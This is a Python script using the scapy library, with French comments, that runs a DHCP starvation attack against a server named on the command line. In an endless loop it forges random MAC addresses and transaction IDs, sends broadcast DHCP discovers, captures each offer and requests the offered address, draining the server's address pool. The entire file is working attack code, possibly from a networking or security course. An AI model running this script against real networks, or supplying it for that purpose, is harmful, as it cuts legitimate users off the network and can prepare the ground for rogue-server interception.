from scapy.all import *
import sys
target = sys.argv[1]
reseau = sys.argv[2]

ip, mask = reseau.split("/")
mask = int(mask)
ip_cible = ip.split(".")
mac_dest = "ff:ff:ff:ff:ff:ff"

# fonction pour obtenir l'adresse donnée par le serveur en vérifiant que l'identifiant dhcp correspond bien à celui du discover
def get_off_addr(rep, xid: int):
        for pkt in rep:
                if(pkt.haslayer(BOOTP) and pkt.haslayer(DHCP) and pkt[BOOTP].xid == xid and ("message-type", 2) in pkt[DHCP].options):
                        return pkt[BOOTP].yiaddr

# fonction pour lancer un dhcp discover, prenant en paramètre l'identifiant de l'échange dhcp généré aléatoirement, et la mac source générée aléatoirement
def dhcp_discover(xid, mac_source) :
        off_pkt = Ether(src=mac_source, dst=mac_dest, type=0x0800)
        off_pkt /= IP(src='0.0.0.0', dst="255.255.255.255")
        off_pkt /= UDP(sport=68, dport=67)
        off_pkt /= BOOTP(chaddr=mac2str(mac_source), xid=xid, flags=0xFFFFFF)
        off_pkt /= DHCP(options=[("message-type", "discover"),"end"])
        sendp(off_pkt)

# fonction pour lancer un dhcp request, prenant en paramètre, l'addresse offerte par le serveur, l'id d'échange dhcp et la mac source.
def dhcp_request(off_addr,xid,mac_source):
        conf.checkIPaddr = False
        req_pkt = Ether(src=mac_source, dst=mac_dest)
        req_pkt /=IP(src="0.0.0.0", dst="255.255.255.255")
        req_pkt /=UDP(sport=68, dport=67)
        req_pkt /= BOOTP(chaddr=mac2str(mac_source), xid=xid)
        req_pkt /= DHCP(options=[("message-type", "request"), ("requested_addr", off_addr), ("server_id", target), "end"])
        print("sent request")
        sendp(req_pkt)

# lancement de la boucle : génération de mac source et d'id dhcp, lancement du sniffing en même temps que le dhcp discover
while True:
        mac_source = str(RandMAC())
        xid = random.randint(1, 1000000000)
        rep = sniff(
                filter="udp and (port 67 or 68)",
                timeout=2,
                started_callback=lambda: dhcp_discover(xid, mac_source)
                )
        print("sniffed answer ")
        # on récupère l'adresse offerte par le serveur
        off_addr = get_off_addr(rep, xid)
        if not off_addr or off_addr == "0.0.0.0":
                # si les infos retournée par le sniff sont nulle la boucle est relancée
                print("Nothing returned by sniff")
        else:
                # si le sniff renvoi des infos on lance le dhcp request avec l'adresse offerte par le serveur
                print("got offered address", off_addr)
                dhcp_request(off_addr,xid,mac_source)
                print("sent request, starting over")